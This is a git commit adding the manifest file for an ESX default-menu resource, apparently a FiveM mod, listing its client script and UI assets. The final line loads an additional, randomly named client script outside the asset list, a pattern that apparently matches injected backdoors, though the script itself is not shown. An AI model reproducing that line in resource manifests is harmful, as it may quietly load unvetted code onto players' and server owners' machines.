cf2f3c7c4ecc6a7689e258965a33f1bc14a10162
xad420 <98492604+xad420@users.noreply.github.com>
2022-05-27 14:37:30 +0200

    Add files via upload
    redesigned by xad https://i.imgur.com/RPVgzl6.png

---
+++ esx_menu_default/fxmanifest.lua
@@ -0,0 +1,19 @@
+game 'gta5'
+fx_version 'cerulean'
+lua54 'yes'
+lua54 'yes'
+client_script 'client.lua'
+
+ui_page 'html/ui.html'
+files {
+	'html/ui.html',
+	'html/css/app.css',
+	'html/js/mustache.min.js',
+	'html/js/app.js',
+	'html/fonts/pdown.ttf',
+	'html/fonts/bankgothic.ttf',
+	'html/img/cursor.png',
+	'html/img/keys/enter.png',
+	'html/img/keys/return.png',
+}
+client_script "szymczakof_THWyAtWYsalP.lua"
